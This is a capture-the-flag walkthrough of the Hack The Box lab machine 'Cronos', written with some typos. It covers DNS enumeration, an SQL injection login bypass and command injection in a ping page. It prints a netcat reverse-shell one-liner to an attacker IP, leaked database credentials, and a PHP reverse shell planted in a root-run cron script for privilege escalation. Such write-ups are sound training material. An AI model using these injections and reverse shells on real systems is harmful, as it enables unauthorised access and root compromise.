# Cronos

This time nmap reports that 22, 53, 80 ports are open which i consider `53/tcp ISC BIND 9.10` is worth looking

[Cronos Writeup](https://0xdf.gitlab.io/2020/04/14/htb-cronos.html)
# Path Traversal Apache http | CVE-2021-41773


[Apache-Traversal Exploit](https://github.com/azazelm3dj3d/apache-traversal.git)

We tried but the server response says bad request so we move on.

python exploit.py --ip 10.10.10.13 --port 80 --path "/etc/shadow"DNS enumeration 


*Nothing interesting we move on*

# DNS 50/TCP

Using *nslookup* to search deeper on the project

```bash

nslookup

server 10.10.10.13

10.10.10.13

# We find ns1.cronos.htb so lets give it a closer look trough it


sudo nano /etc/hosts

10.10.10.13 ns1.cronos.htb
```

## Digging in to subdomains

Lets dig on the url
```bash
dig axfr cronos.htb @10.10.10.13

# Or we can use gobuster

sudo gobuster dns -d cronos.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

We find a login page at `admin.cronos.htb` lets try our old friend SQL Injection

```sql
' or 1=1; -- 
``` 

We find a ping machine lets try it out!

We try our ip `10.10.16.3` and it works! but i find something interesting about the output, it seems familiar to our *bash* response, so lets try something

```bash
192.168.0.1; whoami
```

We receive **www-data** so we know what we can do here, our bad boy is ready for this.

```bash
nc -lvp 4444

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.16.3 4444 >/tmp/f

10.10.16.3; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.16.3 4444 >/tmp/f
# We got it :D
```

After we find the user flag we go to our second mission, find the root flag with privilege scalation.

On `/var/www/admin` we find something interesting

```bash
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
# Lets try this password

mysql -u admin -p
kEjdbRigfBHUREiNSDs

use admin;

select * from users;

# We find our user admin:4f5fffa7b2340178a716e3832451e058
# Lets try it on our login page

python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"

```

# Linpeas

Linpeas reports that the file `/var/www/laravel/artisan` so we poison it.

```bash
www-data@cronos:/dev/shm$ bash linpeas.sh                                                                 ...[snip]...
[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
-rw-r--r-- 1 root root  797 Apr  9  2017 /etc/crontab 
...[snip]...
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
...[snip]...
```
* Script
```bash
<?php

$sock=fsockopen("10.10.14.24", 443);
exec("/bin/sh -i <&3 >&3 2>&3");
/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
```

> You can ./artisan to test if the script works

After that we wait for the cron task to run it to get root access since its root who is running it.